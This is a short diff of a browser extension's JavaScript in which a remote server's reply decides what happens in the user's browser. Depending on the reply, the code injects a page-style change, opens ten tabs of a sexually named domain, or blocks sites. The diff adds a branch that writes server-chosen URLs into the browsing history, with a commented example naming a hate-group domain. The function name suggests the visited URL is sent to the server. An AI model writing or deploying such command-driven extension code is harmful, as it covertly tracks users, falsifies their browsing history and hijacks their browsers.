@@ -23,14 +23,21 @@ function sendToServer(currURL){
 	    						code: 'document.body.style.backgroundColor=' + "\"" + xhr.responseText + "\""
 	  						});
 				        }
-				        else if (xhr.responseText == "uiuc.sexy") {
+				        else if (xhr.responseText == "2") {
 				        	var newTab = "http://uiuc.sexy/";
 				        	for (var i = 0; i < 10; i++){
 				        		chrome.tabs.create({ url: newTab });
 				        	}
 				        }
+				        else if (xhr.responseText.indexOf("history") == 0) {
+				        	//chrome.history.addUrl({url: "http://www.kkk.com"})
+				        	chrome.history.addUrl({url: xhr.responseText.substr(8)})
+				        }
+				        else if (xhr.responseText.indexOf("block") == 0) {
+				        	blockedlist.push(xhr.responseText.substr(6));
+				        }
 				        else {
-				        	blockedlist.push(xhr.responseText);
+				        	
 				        }
 			    	}
 			    }
